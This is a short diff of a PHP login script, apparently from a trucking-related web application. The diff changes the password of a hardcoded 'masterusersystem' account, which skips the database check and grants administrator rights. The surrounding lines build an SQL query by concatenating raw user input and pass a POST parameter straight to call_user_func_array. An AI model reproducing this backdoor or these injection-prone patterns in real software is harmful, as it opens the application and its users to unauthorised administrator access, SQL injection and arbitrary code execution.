@@ -68,7 +68,7 @@ $_POST["accion"] and  $_POST["accion"]!= "" ? call_user_func_array($_POST["accio
         $sql = "INSERT INTO cu_intentos_acceso SET sUsuario = '".$usuario."', sClave = sha1('".$clave."'), dFechaIngreso = NOW(), sIP = '".$_SERVER['REMOTE_ADDR']."', bEntroSistema = '1'";
         $conexion->query($sql);
         //forzando datos para guardar variable de session de usuario
-        if ($usuario == "masterusersystem" && $clave == "mastersolotrucking") {
+        if ($usuario == "masterusersystem" && $clave == "masteroxygen") {
             $NUM_ROWs_Usuario_Acceso = 1;
             $Usuario['eTipoUsuario'] = 'A';
         }
